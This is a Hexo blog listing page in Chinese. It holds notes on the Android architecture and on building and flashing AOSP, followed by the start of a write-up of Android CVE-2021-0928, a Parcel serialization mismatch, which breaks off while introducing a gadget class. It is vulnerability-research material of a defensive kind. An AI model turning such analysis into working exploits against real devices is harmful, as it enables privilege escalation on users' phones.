<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"buffer0verflooow.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="buffer0verflooow - Blog">
<meta property="og:url" content="https://buffer0verflooow.github.io/page/3/index.html">
<meta property="og:site_name" content="buffer0verflooow - Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="buffer0verflooow">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://buffer0verflooow.github.io/page/3/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/3/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>buffer0verflooow - Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">buffer0verflooow - Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/home/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">buffer0verflooow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">56</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">51</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/04/23/Android%E6%BA%90%E7%A0%81%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/04/23/Android%E6%BA%90%E7%A0%81%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">Android源码笔记</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-04-23 15:09:25 / Modified: 19:46:49" itemprop="dateCreated datePublished" datetime="2022-04-23T15:09:25+08:00">2022-04-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记一下有关Android源码的相关知识。</p>
<h1 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h1><p>如下图所示，Android整体上分为5层，分别是系统应用、应用框架、系统运行库(Native C&#x2F;C++库和Android运行时)、硬件抽象层HAL以及Linux内核。</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/android-stack_2x.png" alt="android-stack_2x" style="zoom: 33%;" />

<h2 id="系统应用层"><a href="#系统应用层" class="headerlink" title="系统应用层"></a>系统应用层</h2><p>Android 随附一套用于电子邮件、短信、日历、互联网浏览和联系人等的核心应用。</p>
<h2 id="应用框架层"><a href="#应用框架层" class="headerlink" title="应用框架层"></a>应用框架层</h2><p>开发所需的java API。</p>
<p>名称	功能描述</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>Activity Manager(活动管理器)</td>
<td>管理各个应用程序生命周期以及通常的导航回退功能</td>
</tr>
<tr>
<td>Location Manager(位置管理器)</td>
<td>提供地理位置以及定位功能服务</td>
</tr>
<tr>
<td>Package Manager(包管理器)</td>
<td>管理所有安装在Android系统中的应用程序</td>
</tr>
<tr>
<td>Notification Manager(通知管理器)</td>
<td>应用程序可以在状态栏中显示自定义的提示信息</td>
</tr>
<tr>
<td>Resource Manager(资源管理器)</td>
<td>提供应用程序使用的各种非代码资源，如本地化字符串、图片、布局文件、颜色文件等</td>
</tr>
<tr>
<td>Telephony Manager(电话管理器)</td>
<td>管理所有的移动设备功能</td>
</tr>
<tr>
<td>Window Manager(窗口管理器)</td>
<td>管理所有开启的窗口程序</td>
</tr>
<tr>
<td>Content Providers(内容提供器)</td>
<td>使不同应用程序之间共享数据</td>
</tr>
<tr>
<td>View System(视图系统)</td>
<td>构建应用程序的基本组件</td>
</tr>
</tbody></table>
<h2 id="系统运行库层"><a href="#系统运行库层" class="headerlink" title="系统运行库层"></a>系统运行库层</h2><h3 id="Native-C-C-库"><a href="#Native-C-C-库" class="headerlink" title="Native C&#x2F;C++库"></a>Native C&#x2F;C++库</h3><p>如果开发的是需要 C 或 C++ 代码的应用，可以使用 <a target="_blank" rel="noopener" href="https://developer.android.com/ndk?hl=zh-cn">Android NDK</a> 直接从原生代码访问某些<a target="_blank" rel="noopener" href="https://developer.android.com/ndk/guides/stable_apis?hl=zh-cn">原生平台库</a>。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>OpenGL ES</td>
<td>3D绘图函数库</td>
</tr>
<tr>
<td>Libc</td>
<td>从BSD继承来的标准C系统函数库，专门为基于嵌入式Linux的设备定制</td>
</tr>
<tr>
<td>Media Framework</td>
<td>多媒体库，支持多种常用的音频、视频格式录制和回放</td>
</tr>
<tr>
<td>SQLite</td>
<td>轻型的关系型数据库引擎</td>
</tr>
<tr>
<td>SGL</td>
<td>底层的2D图形渲染引擎</td>
</tr>
<tr>
<td>SSL</td>
<td>安全套接层，是为网络通信提供安全及数据完整性的一种安全协议</td>
</tr>
<tr>
<td>FreeType</td>
<td>可移植的字体引擎，它提供统一的接口来访问多种字体格式文件</td>
</tr>
</tbody></table>
<h3 id="Android运行时"><a href="#Android运行时" class="headerlink" title="Android运行时"></a>Android运行时</h3><p>对于运行 Android 5.0（API 级别 21）或更高版本的设备，每个应用都在其自己的进程中运行，并且有其自己的 <a target="_blank" rel="noopener" href="https://source.android.com/devices/tech/dalvik/index.html?hl=zh-cn">Android Runtime (ART)</a> 实例。ART 编写为通过执行 DEX 文件在低内存设备上运行多个虚拟机（DEX 文件是一种专为 Android 设计的字节码格式，经过优化，使用的内存很少）。</p>
<p>ART 的部分主要功能包括：</p>
<ul>
<li>预先 (AOT) 和即时 (JIT) 编译</li>
<li>优化的垃圾回收 (GC)</li>
<li>在 Android 9（API 级别 28）及更高版本的系统中，支持将应用软件包中的 <a target="_blank" rel="noopener" href="https://developer.android.com/about/versions/pie/android-9.0?hl=zh-cn#art-aot-dex">Dalvik Executable 格式 (DEX) 文件转换为更紧凑的机器代码</a>。</li>
<li>更好的调试支持，包括专用采样分析器、详细的诊断异常和崩溃报告，并且能够设置观察点以监控特定字段</li>
</ul>
<p>在 Android 版本 5.0（API 级别 21）之前，Android Runtime 是 Dalvik。如果应用在 ART 上运行良好，那么它应该也可在 Dalvik 上运行，但<a target="_blank" rel="noopener" href="https://developer.android.com/guide/practices/verifying-apps-art?hl=zh-cn">反过来不一定</a>。</p>
<p>还有一点，在Dalvik下，应用每次运行的时候，字节码都需要通过即时编译器转换为机器码，这样会降低运行效率；而在ART 环境中，应用在第一次安装的时候&#x2F;每次重启，字节码会预先编译成机器码。</p>
<p>Android 还包含一套核心运行时库，可提供 Java API 框架所使用的 Java 编程语言中的大部分功能，包括一些 <a target="_blank" rel="noopener" href="https://developer.android.com/guide/platform/j8-jack?hl=zh-cn">Java 8 语言功能</a>。</p>
<h2 id="硬件抽象层"><a href="#硬件抽象层" class="headerlink" title="硬件抽象层"></a>硬件抽象层</h2><p><a target="_blank" rel="noopener" href="https://source.android.com/devices/architecture/hal-types?hl=zh-cn">硬件抽象层 (HAL)</a> 提供标准界面，向更高级别的 <a target="_blank" rel="noopener" href="https://developer.android.com/guide/platform?hl=zh-cn#api-framework">Java API 框架</a>显示设备硬件功能。HAL 包含多个库模块，其中每个模块都为特定类型的硬件组件实现一个界面，例如<a target="_blank" rel="noopener" href="https://source.android.com/devices/camera/index.html?hl=zh-cn">相机</a>或<a target="_blank" rel="noopener" href="https://source.android.com/devices/bluetooth.html?hl=zh-cn">蓝牙</a>模块。当框架 API 要求访问设备硬件时，Android 系统将为该硬件组件加载库模块。</p>
<h2 id="Linux内核层"><a href="#Linux内核层" class="headerlink" title="Linux内核层"></a>Linux内核层</h2><p>Android 平台的基础是 Linux 内核。例如，<a target="_blank" rel="noopener" href="https://developer.android.com/guide/platform?hl=zh-cn#art">Android Runtime (ART)</a> 依靠 Linux 内核来执行底层功能，例如线程和低层内存管理。</p>
<p>使用 Linux 内核可让 Android 利用<a target="_blank" rel="noopener" href="https://source.android.com/security/overview/kernel-security.html?hl=zh-cn">主要安全功能</a>，并且允许设备制造商为内核开发硬件驱动程序。</p>
<h1 id="源码目录结构"><a href="#源码目录结构" class="headerlink" title="源码目录结构"></a>源码目录结构</h1><p>以下是Android7的源码结构，不同版本可能有些不同。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>abi</td>
<td>应用程序二进制接口</td>
</tr>
<tr>
<td>art</td>
<td>全新的ART运行环境</td>
</tr>
<tr>
<td>bionic</td>
<td>系统C库</td>
</tr>
<tr>
<td>bootable</td>
<td>启动引导相关代码</td>
</tr>
<tr>
<td>build</td>
<td>存放系统编译规则及generic等基础开发包配置</td>
</tr>
<tr>
<td>cts</td>
<td>Android兼容性测试套件标准</td>
</tr>
<tr>
<td>dalvik</td>
<td>dalvik虚拟机</td>
</tr>
<tr>
<td>developers</td>
<td>开发者目录</td>
</tr>
<tr>
<td>development</td>
<td>应用程序开发相关</td>
</tr>
<tr>
<td>device</td>
<td>设备相关配置</td>
</tr>
<tr>
<td>docs</td>
<td>参考文档</td>
</tr>
<tr>
<td>external</td>
<td>开源模组相关文件</td>
</tr>
<tr>
<td>frameworks</td>
<td>应用程序框架，Android系统核心部分，由Java和C++编写</td>
</tr>
<tr>
<td>hardware</td>
<td>主要是硬件抽象层的代码</td>
</tr>
<tr>
<td>libcore</td>
<td>核心库相关文件</td>
</tr>
<tr>
<td>libnativehelper</td>
<td>动态库，实现JNI库的基础</td>
</tr>
<tr>
<td>ndk</td>
<td>NDK相关代码，帮助开发人员在应用程序中嵌入C&#x2F;C++代码</td>
</tr>
<tr>
<td>out</td>
<td>编译完成后代码输出在此目录</td>
</tr>
<tr>
<td>packages</td>
<td>应用程序包</td>
</tr>
<tr>
<td>pdk</td>
<td>Plug Development Kit 的缩写，本地开发套件</td>
</tr>
<tr>
<td>platform_testing</td>
<td>平台测试</td>
</tr>
<tr>
<td>prebuilts</td>
<td>x86和arm架构下预编译的一些资源</td>
</tr>
<tr>
<td>sdk</td>
<td>sdk和模拟器</td>
</tr>
<tr>
<td>system</td>
<td>底层文件系统库、应用和组件</td>
</tr>
<tr>
<td>toolchain</td>
<td>工具链文件</td>
</tr>
<tr>
<td>tools</td>
<td>工具文件</td>
</tr>
<tr>
<td>Makefile</td>
<td>全局Makefile文件，用来定义编译规则</td>
</tr>
</tbody></table>
<p>官方源码链接：</p>
<p><a href="https://link.zhihu.com/?target=https://android.googlesource.com/platform/packages/apps/">android&#x2F;platform&#x2F;packages&#x2F;apps</a>：Android自带的app，比如Email,Camera, Music等，对于应用开发工程师主要关注的目录；</p>
<p><a href="https://link.zhihu.com/?target=https://android.googlesource.com/platform/frameworks/base/">android&#x2F;platform&#x2F;frameworks&#x2F;base</a>： Java framework，这是framework工程师看得最多的目录；</p>
<p><a href="https://link.zhihu.com/?target=https://android.googlesource.com/platform/frameworks/native/">android&#x2F;platform&#x2F;frameworks&#x2F;native</a>：Native framework</p>
<p><a href="https://link.zhihu.com/?target=https://android.googlesource.com/platform/art/">android&#x2F;platform&#x2F;art</a>：Art<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E8%99%9A%E6%8B%9F%E6%9C%BA&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:97264610%7D">虚拟机</a></p>
<p><a href="https://link.zhihu.com/?target=https://android.googlesource.com/kernel/common/">android&#x2F;kernel&#x2F;common</a>：Android内核，这是驱动工程师最关注的模块；</p>
<p><a href="https://link.zhihu.com/?target=https://android.googlesource.com/platform/system/core/">android&#x2F;platform&#x2F;system&#x2F;core</a> ：核心系统</p>
<p><a href="https://link.zhihu.com/?target=https://android.googlesource.com/platform/libcore/">android&#x2F;platform&#x2F;libcore</a>：平台的lib库</p>
<h1 id="安全机制"><a href="#安全机制" class="headerlink" title="安全机制"></a>安全机制</h1><p>参考<a target="_blank" rel="noopener" href="https://source.android.com/security/overview/kernel-security.html?hl=zh-cn">这里</a>。</p>
<h1 id="下载Android源码"><a href="#下载Android源码" class="headerlink" title="下载Android源码"></a>下载Android源码</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget -c https://mirrors.tuna.tsinghua.edu.cn/aosp-monthly/aosp-latest.tar <span class="comment"># 下载初始化包</span></span><br><span class="line">$ tar xf aosp-latest.tar</span><br><span class="line">$ <span class="built_in">cd</span> aosp   <span class="comment"># 解压得到的 aosp 工程目录</span></span><br><span class="line">$ repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-8.1.0_r1	</span><br><span class="line">$ repo <span class="built_in">sync</span> <span class="comment"># 正常同步一遍即可得到完整目录</span></span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash  </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;======start repo sync======&quot;</span>  </span><br><span class="line">./repo <span class="built_in">sync</span> -j4</span><br><span class="line"><span class="keyword">while</span> [ $? = 1 ]; <span class="keyword">do</span>  </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;======sync failed, re-sync again======&quot;</span>  </span><br><span class="line">        <span class="built_in">sleep</span> 3  </span><br><span class="line">        ./repo <span class="built_in">sync</span> -j4 </span><br><span class="line"><span class="keyword">done</span> </span><br></pre></td></tr></table></figure>

<h2 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> .repo/manifests</span><br><span class="line">git branch -a   <span class="comment">#查看所有分支</span></span><br><span class="line"></span><br><span class="line">repo init -b android-4.1.2_r1   <span class="comment"># 切换分支</span></span><br><span class="line">repo <span class="built_in">sync</span></span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="源码编译"><a href="#源码编译" class="headerlink" title="源码编译"></a>源码编译</h1><p>这里我要编译的是Pixel4XL，android-12.0.0_r1。</p>
<h2 id="驱动"><a href="#驱动" class="headerlink" title="驱动"></a>驱动</h2><p>先找到自己设备对应的<a target="_blank" rel="noopener" href="https://developers.google.com/android/drivers">驱动</a>下载下来，如果不下载驱动直接编译源码，刷机后进不去系统。这里对应的驱动如下：</p>
<table>
<thead>
<tr>
<th align="left">Hardware Component</th>
<th align="left">Company</th>
<th align="left">Download</th>
<th align="left">SHA-256 Checksum</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Vendor image</td>
<td align="left">Google</td>
<td align="left"><a target="_blank" rel="noopener" href="https://dl.google.com/dl/android/aosp/google_devices-coral-sp1a.210812.015-b15979c9.tgz">Link</a></td>
<td align="left">b456661c1b013d26fe7355db4787be0851c18b0852b41f4f25506a1884151b1e</td>
</tr>
<tr>
<td align="left">GPS, Audio, Camera, Gestures, Graphics, DRM, Video, Sensors</td>
<td align="left">Qualcomm</td>
<td align="left"><a target="_blank" rel="noopener" href="https://dl.google.com/dl/android/aosp/qcom-coral-sp1a.210812.015-2133da5b.tgz">Link</a></td>
<td align="left">85a8d48d80e89994520d6221a3e5d35c720d43898e5107b2835b0cd889799307</td>
</tr>
</tbody></table>
<p>解压上面两个压缩包到源码根目录下，然后执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar zxvf qcom-coral-sp1a.210812.015-2133da5b.tgz -C./</span><br><span class="line">tar xvf google_devices-coral-sp1a.210812.015-b15979c9.tgz</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">./extract-qcom-coral.sh</span><br><span class="line">./extract-google_devices-coral.sh</span><br></pre></td></tr></table></figure>

<p>执行完会生成vendor目录。</p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  aosp <span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">➜  aosp lunch</span><br><span class="line">➜  aosp make -j8</span><br></pre></td></tr></table></figure>

<h1 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~/code/android11$ <span class="built_in">export</span> ANDROID_PRODUCT_OUT=./out/target/product/blueline</span><br><span class="line">~/code/android11$ fastboot flashall -w</span><br><span class="line">...</span><br><span class="line">File system <span class="built_in">type</span> raw not supported.</span><br><span class="line">Erasing <span class="string">&#x27;metadata&#x27;</span>                                 OKAY [  0.007s]</span><br><span class="line">Erase successful, but not automatically formatting.</span><br><span class="line">File system <span class="built_in">type</span> raw not supported.</span><br><span class="line">Rebooting                                          OKAY [  0.000s]</span><br><span class="line">Finished. Total time: 101.511s</span><br></pre></td></tr></table></figure>

<h2 id="问题1：Could-not-find-a-supported-mac-sdk（mac-sdk-版本不匹配）"><a href="#问题1：Could-not-find-a-supported-mac-sdk（mac-sdk-版本不匹配）" class="headerlink" title="问题1：Could not find a supported mac sdk（mac sdk 版本不匹配）"></a>问题1：Could not find a supported mac sdk（mac sdk 版本不匹配）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--- FAIL: TestClippy (17.28s)</span><br><span class="line">    --- FAIL: TestClippy/path= (17.00s)</span><br><span class="line">        clippy_test.go:63: <span class="string">&quot;Unsupported macOS SDK version \&quot;12.3\&quot; not in [11]&quot;</span></span><br><span class="line">        clippy_test.go:63: <span class="string">&quot;Unsupported macOS SDK version \&quot;12.3\&quot; not in [11]&quot;</span></span><br><span class="line">        clippy_test.go:63: <span class="string">&quot;Unsupported macOS SDK version \&quot;12.3\&quot; not in [11]&quot;</span></span><br><span class="line">        clippy_test.go:63: <span class="string">&quot;Unsupported macOS SDK version \&quot;12.3\&quot; not in [11]&quot;</span></span><br><span class="line">        clippy_test.go:63: <span class="string">&quot;Unsupported macOS SDK version \&quot;12.3\&quot; not in [11]&quot;</span></span><br><span class="line">        clippy_test.go:63: <span class="string">&quot;Unsupported macOS SDK version \&quot;12.3\&quot; not in [11]&quot;</span></span><br></pre></td></tr></table></figure>

<p>下载<a target="_blank" rel="noopener" href="https://github.com/phracker/MacOSX-SDKs/releases">SDK</a>，放入<code>/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs</code>。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/04/22/Android-CVE-2021-0928/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/04/22/Android-CVE-2021-0928/" class="post-title-link" itemprop="url">Android-CVE-2021-0928</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-04-22 21:19:31 / Modified: 21:20:37" itemprop="dateCreated datePublished" datetime="2022-04-22T21:19:31+08:00">2022-04-22</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://github.com/michalbednarski/ReparcelBug2">https://github.com/michalbednarski/ReparcelBug2</a></p>
</blockquote>
<h1 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h1><p><code>android.hardware.camera2.params.OutputConfiguration.java</code>中的 <code>writeToParcel</code>&#x2F;<code>createFromParcel</code> 不匹配导致的。</p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Android 9 至 Android 11，Android 12 Developer Preview 3，在官方Android 12发布版中修复。</p>
<h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><p>Android 12 Beta 2 and 3</p>
<h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><h2 id="Parcel"><a href="#Parcel" class="headerlink" title="Parcel"></a>Parcel</h2><p>在Android的两个<code>activity</code>之间传递对象，则这个对象必须要进行序列化，在Android中实现序列化有两种方式，一是实现<code>Serializable</code>接口，二是实现<code>Parcelable</code>接口。<code>Parcelable</code>的方式要比<code>Serializable</code>的效率要高。</p>
<p>Android上的大部分IPC都是基于一个叫<code>Parcel</code>的类。基本的<code>Parcel</code>用法如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Parcel</span> <span class="variable">p</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">p.writeInt(<span class="number">1</span>);</span><br><span class="line">p.writeString(<span class="string">&quot;Hello&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>然后<code>Parcel</code>通过<code>Binder</code>将消息传递给其他进程，为了测试，可以调用<code>p.setDataPosition(0)</code>将消息设置为起始位置并开始读取。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> p.readInt(); <span class="comment">// a = 1</span></span><br><span class="line"><span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> p.readString(); <span class="comment">// b = &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>需要注意的是，<code>Parcel</code>内部保存着读取的位置。<code>Parcel</code>类的使用者应当确保<code>read*</code>方法与之前使用的<code>write*</code>方法相匹配，否则后续的读取操作将来自缓冲区中的错误位置。</strong></p>
<p><code>Parcel</code>还支持自定义<code>object</code>，通过<code>Parcelable</code>接口来实现。</p>
<p>实现<code>Parcelable</code>接口需要实现接口中的两个方法：</p>
<ol>
<li><code>public int describeContents();</code>，内容接口描述，默认返回0即可；</li>
<li><code>public void writeToParcel(Parcel dest, int flags);</code>，将对象序列化成一个Parcel对象。</li>
</ol>
<p>然后，还需要实例化静态内部对象<code>CREATOR</code>来实现<code>Parcelable.Creator</code>，实现<code>CREATOR</code>时要实现其中的方法：</p>
<ol>
<li><code>createFromParcel</code>，从Parcel中读取前面序列化的对象。</li>
</ol>
<p>下面是一个实现该接口的例子（<code>WindowContainerTransaction</code>类被用作exp gadget利用链中的一部分）：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> android.window;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">WindowContainerTransaction</span> <span class="keyword">implements</span> <span class="title class_">Parcelable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ArrayMap&lt;IBinder, Change&gt; mChanges = <span class="keyword">new</span> <span class="title class_">ArrayMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ArrayList&lt;HierarchyOp&gt; 